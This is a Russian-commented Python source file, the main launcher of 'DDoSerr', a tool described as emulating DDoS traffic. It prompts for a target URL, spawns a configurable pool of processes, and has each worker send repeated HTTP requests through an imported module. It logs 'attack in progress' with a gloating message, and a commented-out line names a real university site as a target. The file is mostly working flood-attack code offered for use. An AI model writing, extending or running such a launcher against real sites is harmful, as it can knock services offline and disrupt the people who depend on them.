#!/usr/bin/python3
#Путь к интерпретатору пайтона.
# -*- coding: utf-8 -*-
#Выбор кодировки (без него не работает русский язык).

"""
This file is part of DDoSerr.
DDoSerr is a research program for emulating (D)DoS traffic and
its analysis (in development).
Use this program on your own pril and risk, as with improper use 
there is a risk of disruption of the network infrastucture.
DDoSerr Copyright © 2018 Konstantin Pankov 
(e-mail: konstantin.p.96@gmail.com), Mikhail Ryapolov.

    DDoSerr is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    Any distribution and / or change must be agreed with the authors and
    is prohibited without their permission.
    At this stage of the program development, authors are forbidden to 
    embed any of DDoSerr modules (code components) into other programs.

    DDoSerr is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with DDoSerr.  If not, see <https://www.gnu.org/licenses/>.


Этот файл — часть DDoSerr.
DDoSerr — это исследовательская программа для эмуляции (D)DoS трафика и 
его анализа (в разработке). 
Используйте эту программу на свой страх и риск, так как при неправильном
применении есть риск нарушения работы сетевой инфраструктуры.
DDoSerr Copyright © 2018 Константин Панков 
(e-mail: konstantin.p.96@gmail.com), Михаил Ряполов.

   DDoSerr - свободная программа: вы можете перераспространять ее и/или
   изменять ее на условиях Стандартной общественной лицензии GNU
   в том виде, в каком она была опубликована 
   Фондом свободного программного обеспечения; либо версии 3 лицензии, 
   либо (по вашему выбору) любой более поздней версии.

   Любое распространиение и/или изменение должно быть согласовано с
   авторами и запрещается без их разрешения.
   На данном этапе развития программы авторами запрещается встраивать 
   любой из модулей (компонентов кода) DDoSerr в другие программы.

   DDoSerr распространяется в надежде, что она будет полезной,
   но БЕЗО ВСЯКИХ ГАРАНТИЙ; даже без неявной гарантии ТОВАРНОГО ВИДА
   или ПРИГОДНОСТИ ДЛЯ ОПРЕДЕЛЕННЫХ ЦЕЛЕЙ. Подробнее см. в Стандартной
   общественной лицензии GNU.

   Вы должны были получить копию Стандартной общественной лицензии GNU
   вместе с этой программой. Если это не так, см.
   <https://www.gnu.org/licenses/>.
"""

"""
Программа DDoSerr. Основной исполняемый файл.
v.1.6.4.3b. от 02.08.2018.

Считывает и, при необходимости, переопределяет настройки,
запускает модуль HTTP-запросов и логгирует ответы.
"""

"""
Легенда обозначений:
"___" - переделать / удалить;
"---" - отладка;
"~~~" - сделать;
"!" - первоочередная задача.
"""

#Подключаем парсер конфига.
import configparser
#Подключаем свой модуль запросов.
import http_requests
#Подключаем модуль системных команд.
import sys
#Подключаем модуль взаимодействия с системой.
import os
#Подключаем модуль многопроцессорности и многопоточности, а точнее,
#класс Pool.
from multiprocessing import Pool
#Подключаем готовый модуль логгирования.
import logging

#Настройка логгирования.
logging.basicConfig(filename='log.log',level=logging.INFO, \
format='%(asctime)s %(message)s', datefmt='%d.%m.%Y - %I:%M:%S |')

#Перенос кода через '\'.

class Config:
    """
    Класс для работы с конфигрурационными файлами и 
    настройками программы.
    """
    def __init__(self, argv=[], configfile="config.ini"):
        """
        Функция, использующая по умолчанию файл конфигурации
        с именем 'config.ini', в которой можно 
        переопределять настройки из командной строки и
        имя файла конфигурации.
        """
        self.read_config(configfile)
        #!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        if argv:
            #Обработка параметров командной строки и 
            #переопределение настроек. Надо сделать.
            
            pass    #Затычка, ничего не делает.
        #!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    def read_config(self, configfile):
        """
        Функция загрузки настроек из файла конфигурации.
        Механизм чтения конфига, поиска нужных значений 
        и присваивания значений пременным. 
        """
        config = configparser.ConfigParser()
        #Считываем настройки из файла конфигурации.
        config.read(configfile)
        #Читаем значения из конфига.
        #Сразу приводим их в правильный тип.
        self.proc_num = int(config.get("Settings", "ProcNum"))
        self.pause = float(config.get("Settings", "Pause"))
        self.repeat = int(config.get("Settings", "Repeat"))
          
          
    """"
    !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Надо сделать дополнительную функцию под ключи командной строки!
    Если заданы, то переопределяют настройки, если не заданы, 
    то по конфигу.
    interact_input оставить.
    !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    """
    
    
    def interact_input(self):
        """
        Ввод одноразовых настроек из консоли с переопределением переменных.
        Сделать вызов этой функции ключом '-i'.
        """
        #Запрос на переопределение настроек и ввод с клавиатуры.
        switch = input("Хотите ли Вы однократно переопределить заданные в конфиг-файле настройки программы?"+\
            '\n'+"Да - 'y', Нет - 'n'."+'\n'+\
            "Ваш выбор: ")
        if switch == "y":
            print("Введите свои параметры.")
            #Переопределение настроек.
            proc_num = int(input("Введите количество создаваемых потоков: "))
            pause = float(input("Введите длительность паузы между заданиями для одного процесса (секунд): "))
            repeat = int(input("Введите количество повторов запросов: "))  
            
            self.proc_num = proc_num
            self.pause = pause
            self.repeat = repeat
            
        elif switch == "n":
            print("Используются настройки из файла конфигурации.")
            
    
    
    def parse_params(self, args):
        """
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Функция для переопределения настроек
        параметрами командной строки.
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        """
        pass



if __name__ == "__main__":
    """
    Запуск функции main только при запуске этого модуля, 
    но не при импорте.
    Если функция main не задана в явном виде (def main()),
    то весь код (после конструкции if __name__ == "__main__") 
    считается ею.
    """
    
    #Ввод URL атакуемого ресурса. Пока в интерактивном режиме.
    url = str(input("Введите полный адрес цели (с http(s)://): "))
    #url = "https://www.edu.vsu.ru"
    
    #Загрузка настроек из фала конфигурации с сохранением в переменную.
    #Если есть параметры командной строки, то они переопределяют
    #настройки из конфига.
    cfg = Config(sys.argv)
    
    #Вызов функции интерактивного ввода.
    #Позже должна вызываться только по ключу командной строки.
    cfg.interact_input()
    
    
    #Объявляем переменные в этом блоке.
    #Количество процессов.
    proc = cfg.proc_num
    #Количество повторов задания.
    repeat = cfg.repeat
    #Задержка повтора задания.
    pause = cfg.pause
    
    
    """
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #Сделать настройку url (из командной строки).
    #(Добавить в принимаемые аргументы.)
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    """
    
    """
    Реализация многопоточности.
    Получается n процессов: один родительский и n-1 дочерних.
    """
    
    #Вывод информационных сообщений.
    print("DDoSerr запущен." + '\n' + "Атакуемый ресурс: " + url + 
    '\n' + "Запущено процессов: " + str(proc) + '\n' +
    "Дано " + str(repeat) + " заданий с задержкой повторения в " + 
    str(pause) + " секунд(ы)." + '\n' +
    "Атака выполняется." + '\n' + 
    "Пожалуйста, подождите и насладитесь своим величием. :)")
    #Запись информационных сообщений в лог.
    logging.info("DDoSerr запущен." + '\n' + 
    "Атакуемый ресурс: " + url + '\n' +
    "Запущено процессов: " + str(proc) + '\n' + "Дано " + str(repeat) + 
    " заданий с задержкой повторения в " + str(pause) + 
    " секунд(ы)." + '\n' +
    "Атака выполняется." + '\n' + 
    "Пожалуйста, подождите и насладитесь своим величием. :)")
    

    #Создаём пул из 'proc' штук работников (процессов).
    with Pool(processes=proc) as pool:

    #Даём им задание ПО ОДНОМУ через apply_async в цикле
    #и получаем результат.
    
    #Создаётся 'proc' штук процессов с заданием ('пачка').
        for _ in range(proc):
            worker = pool.apply_async(http_requests.http_connection, \
            (repeat, pause, url,))
            
            #Логгируем запуск процесса с его PID.
            logging.info('Process ' + str(os.getpid()) + ' was started.')
            
            #Процессы запускаются только при запросе результата от пула
            #методом get().
            
            #Можно использовать в цикле, тогда будет видно разделение
            #на 'пачки' по количеству процессов и 
            #число запросов по количеству повторов.
        
        #Эта функция не возвращает ничего (точнее, возвращает None), 
        #поэтому просто вызывается.
        worker.get()
        #Без таймаута (timeout=1), т.к. это ограничивает 
        #время работы программы.
